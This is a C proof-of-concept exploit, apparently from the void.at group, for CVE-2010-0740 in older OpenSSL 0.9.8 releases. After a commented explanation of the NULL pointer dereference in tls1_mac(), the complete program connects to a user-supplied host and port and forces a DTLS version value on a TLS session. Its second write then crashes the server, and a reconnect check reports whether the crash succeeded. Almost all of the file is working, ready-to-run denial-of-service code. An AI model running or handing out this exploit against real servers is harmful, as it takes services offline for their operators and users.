/***********************************************************
 * hoagie_openssl_record_of_death.c
 * OPENSSL REMOTE DENIAL-OF-SERVICE EXPLOIT
 * - OpenSSL 0.9.8m (short = 16 bit)
 * - OpenSSL 0.9.8f through 0.9.8m (short != 16 bit)
 *
 * CVE-2010-0740
 *
 * Bug discovered by:
 * Bodo Moeller and Adam Langley (Google)
 * Philip Olausson <po@secweb.se>
 * http://openssl.org/news/secadv_20100324.txt
 *
 * The main problem is in ssl/t1_enc.c => tls1_mac() function
 *
 * - OpenSSL 0.9.8m
 *         if (ssl->version == DTLS1_BAD_VER ||
 *           (ssl->version == DTLS1_VERSION && ssl->client_version != DTLS1_BAD_VER))
 *               {
 *               unsigned char dtlsseq[8],*p=dtlsseq;
 *               s2n(send?ssl->d1->w_epoch:ssl->d1->r_epoch, p);
 *
 * - OpenSSL 0.9.8f - 0.9.8n
 *         if (ssl->version == DTLS1_VERSION && ssl->client_version != DTLS1_BAD_VER)
 *               {
 *               unsigned char dtlsseq[8],*p=dtlsseq;
 *
 *               s2n(send?ssl->d1->w_epoch:ssl->d1->r_epoch, p);
 *
 * There is a NULL pointer dereference => ssl->d1 because d1 is only initialized in
 * ssl/d1_lib.c => dtls1_new(). So if you use SSLv23_server_method() or
 * TLSv1_server_method() this variable will be NULL.
 *
 * If the patch (see http://openssl.org/news/secadv_20100324.txt) is not applied
 * its possible to set the version to DTLS1_BAD_VER (0x100) or DTLS_VERSION (0xfeff)
 * and transmit the packet to the server or client to trigger the vulnerability.
 *
 * When you are using OpenSSL 0.9.8m you can send DTLS1_BAD_VER because 0x100 is not
 * a problem with signed/unsigned.
 *
 * If you are using OpenSSL 0.9.8f to 0.9.8n you have to trigger the vulnerability
 * via DTLS1_VERSION. In that case version will be 0xfffffeff. So it doesnt work
 * if DTLS1_VERSION is 16 bit.
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
 * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
 * DAMAGE DONE USING THIS PROGRAM.
 *
 * VOID.AT Security
 * andi@void.at
 * http://www.void.at
 *
 ************************************************************/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>

/* usage
 * display help screen
 */
void usage(int argc, char **argv) {
   fprintf(stderr,
           "usage: %s [-h] [-v] [-d <host>] [-p <port>]\n"
           "\n"
           "-h        help\n"
           "-v        verbose\n"
           "-d host   SSL server\n"
           "-p port   SSL port\n"
           "-t target\n"
           "   0 ... OpenSSL 0.9.8m (short = 16 bit) - default\n"
           "   1 ... OpenSSL 0.9.8f through 0.9.8m (short != 16 bit)\n"
           ,
           argv[0]);
   exit(1);
}

/* connect_to
 * connect to remote http server
 */
int connect_to(char *host, int port) {
   struct sockaddr_in s_in;
   struct hostent *he;
   int s;

   if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
      return -1;
   }

   memset(&s_in, 0, sizeof(s_in));
   s_in.sin_family = AF_INET;
   s_in.sin_port = htons(port);

   if ( (he = gethostbyname(host)) != NULL)
       memcpy(&s_in.sin_addr, he->h_addr, he->h_length);
   else {
       if ( (s_in.sin_addr.s_addr = inet_addr(host) ) < 0) {
          return -3;
       }
   }

   if (connect(s, (struct sockaddr *)&s_in, sizeof(s_in)) == -1) {
      return -4;
   }

   return s;
}

/* ssl_connect_to
 * establish ssl connection over tcp connection
 */
SSL *ssl_connect_to(int s) {
   SSL *ssl;
   SSL_CTX *ctx;
   BIO *sbio;
   SSL_METHOD *meth;

   CRYPTO_malloc_init();
   SSL_load_error_strings();
   SSL_library_init();

   // meth = TLSv1_client_method();
   meth = SSLv23_client_method();
   ctx = SSL_CTX_new(meth);
   ssl = SSL_new(ctx);
   sbio = BIO_new_socket(s, BIO_NOCLOSE);
   SSL_set_bio(ssl, sbio, sbio);

   if (SSL_connect(ssl) <= 0) {
      return NULL;
   }

   return ssl;
}


int main(int argc, char **argv) {
   struct sockaddr_in s_in;
   struct hostent *he;
   char data[1024];

   int s;
   int target = 0;
   char c;
   char *destination = NULL;
   int port = 0;
   SSL *ssl = NULL;

   fprintf(stderr,
           "hoagie_openssl_record_of_death.c - openssl ssl3_get_record() remote\n"
           "-andi / void.at\n\n");

   if (argc < 2) {
      usage(argc, argv);
   } else {
      while ((c = getopt (argc, argv, "hd:p:t:")) != EOF) {
         switch (c) {
            case 'h':
                 usage(argc, argv);
                 break;
            case 'd':
                 destination = optarg;
                 break;
            case 'p':
                 port = atoi(optarg);
                 break;
            case 't':
                 target = atoi(optarg);
                 break;
         }
      }

      if (!destination || !port) {
         fprintf(stderr, "[*] destination and/or port missing\n");
      } else if (target && target != 1) {
         fprintf(stderr, "[*] invalid target '%d'\n", target);
      } else {
         s = connect_to(destination, port);
         if (s > 0) {
            fprintf(stderr, "[+] tcp connection to '%s:%d' successful\n", destination, port);
            ssl = ssl_connect_to(s);
            if (ssl) {
               fprintf(stderr, "[+] ssl connection to '%s:%d' successful\n", destination, port);
               snprintf(data, sizeof(data), "GET / HTTP/1.0\r\n\r\n");

               fprintf(stderr, "[+] sending first packet ...\n");
               SSL_write(ssl, data, strlen(data));

               if (!target) {
                  ssl->version = DTLS1_BAD_VER;
               } else {
                  ssl->version = DTLS1_VERSION;
               }

               fprintf(stderr, "[+] sending second paket ...\n");
               SSL_write(ssl, data, strlen(data));

               SSL_shutdown(ssl);
               close(s);

               sleep(1);

               s = connect_to(destination, port);
               if (s > 0) {
                  fprintf(stderr, "[-] exploit failed\n");
                  close(s);
               } else {
                  fprintf(stderr, "[+] exploit successful\n");
               }
            } else {
               fprintf(stderr, "[-] ssl connection to '%s:%d' failed\n", destination, port);
            }
         } else {
            fprintf(stderr, "[-] tcp connection to '%s:%d' failed\n", destination, port);
         }
      }
   }

   return 0;
}